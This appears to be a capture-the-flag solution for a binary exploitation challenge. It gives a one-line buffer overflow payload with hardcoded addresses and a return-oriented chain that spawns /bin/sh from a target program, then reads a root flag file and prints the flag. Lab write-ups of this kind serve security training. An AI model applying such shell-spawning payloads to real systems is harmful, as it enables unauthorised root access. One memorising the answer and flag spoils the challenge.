# Solution

This solution needs to be checked manually.

First start the challenge: `./run.sh`

Then from within the emulated system run the following command to exploit the target
```bash
(echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x13\xc6\xff\xf7(\
x80\x04\x08z\xc5\xff\xf7\x00\x00\x00\x00\x17\x00\x00\x00|\xc6\xff\xf7AAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00AAAAAAAAAAAAw\xc5\xff\xf7(\x80\
x04\x08\x00\x00\x00\x00\x0b\x00\x00\x00|\xc6\xff\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA \xdf\xff\xffAAAAAAAAAAAAz\xc5\xff\xf7\x00\x00\x00\x00(\xdf\xff\
xffw\xc5\xff\xf7/bin/sh\x00%\xdf\xff\xff\x00\x00\x00\x00'; cat) | ./target
```
then from within the exploited program get the flag with 
```bash
cat /root/flag.txt
HTB{Sm4sh1nG_Th3_V01d_F0r_Fun_4nd_Pr0f1t} 
```

